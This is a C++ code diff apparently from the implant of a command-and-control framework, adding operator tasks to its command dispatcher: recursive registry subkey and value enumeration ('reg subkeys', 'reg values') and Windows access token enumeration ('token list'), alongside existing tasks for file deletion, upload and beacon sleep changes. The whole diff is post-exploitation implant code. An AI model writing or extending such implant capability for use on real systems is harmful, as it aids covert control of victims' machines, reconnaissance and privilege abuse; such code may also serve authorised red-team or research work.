@@ -470,6 +470,22 @@ std::wstring ExecuteTaskPwd()
     return std::wstring(wBuffer);
 }
 
+std::wstring ExecuteTaskRegSubKeys(
+    const std::wstring& wRootKey,
+    const std::wstring& wSubKey,
+    BOOL bRecurse
+) {
+    return GetRegSubKeys(wRootKey, wSubKey, bRecurse);
+}
+
+std::wstring ExecuteTaskRegValues(
+    const std::wstring& wRootKey,
+    const std::wstring& wSubKey,
+    BOOL bRecurse
+) {
+    return GetRegValues(wRootKey, wSubKey, bRecurse);
+}
+
 std::wstring ExecuteTaskRm(const std::wstring& wFile)
 {
     if (!DeleteFileW(wFile.c_str()))
@@ -502,6 +518,11 @@ std::wstring ExecuteTaskSleep(
     INT newSleepTime = std::stoi(wSleepTime);
     nSleep = newSleepTime;
     return L"Success: The sleep time has been updated.";
+}
+
+std::wstring ExecuteTaskTokenList()
+{
+    return EnumerateTokens();
 }
 
 std::wstring ExecuteTaskUpload(
@@ -661,6 +682,42 @@ std::wstring ExecuteTask(
 	{
 		return ExecuteTaskPwd();
 	}
+    else if (wcscmp(task.substr(0, 12).c_str(), L"reg subkeys ") == 0)
+    {
+        // Parse arguments.
+        std::vector<std::wstring> wArgs = SplitW(task, L' ');
+        if (wArgs.size() < 5)
+        {
+            return L"Error: Invalid argument.";
+        }
+        BOOL bRecurse = wArgs[2] == L"true";
+        std::wstring wRootKey = wArgs[3];
+        std::wstring wSubKey;
+        for (size_t i = 4; i < wArgs.size(); i++)
+        {
+            wSubKey += wArgs[i];
+        }
+
+        return ExecuteTaskRegSubKeys(wRootKey, wSubKey, bRecurse);
+    }
+    else if (wcscmp(task.substr(0, 11).c_str(), L"reg values ") == 0)
+    {
+        // Parse arguments.
+        std::vector<std::wstring> wArgs = SplitW(task, L' ');
+        if (wArgs.size() < 5)
+        {
+            return L"Error: Invalid argument.";
+        }
+        BOOL bRecurse = wArgs[2] == L"true";
+        std::wstring wRootKey = wArgs[3];
+        std::wstring wSubKey;
+        for (size_t i = 4; i < wArgs.size(); i++)
+        {
+            wSubKey += wArgs[i];
+        }
+
+        return ExecuteTaskRegValues(wRootKey, wSubKey, bRecurse);
+    }
     else if (wcscmp(task.substr(0, 3).c_str(), L"rm ") == 0)
     {
         return ExecuteTaskRm(task.substr(3, task.size()));
@@ -677,6 +734,10 @@ std::wstring ExecuteTask(
 	{
 		return ExecuteTaskSleep(task.substr(6, task.size()), nSleep);
 	}
+    else if (wcscmp(task.substr(0, 10).c_str(), L"token list") == 0)
+    {
+        return ExecuteTaskTokenList();
+    }
     else if (wcscmp(task.substr(0, 7).c_str(), L"upload ") == 0)
     {
         // Parse arguments.
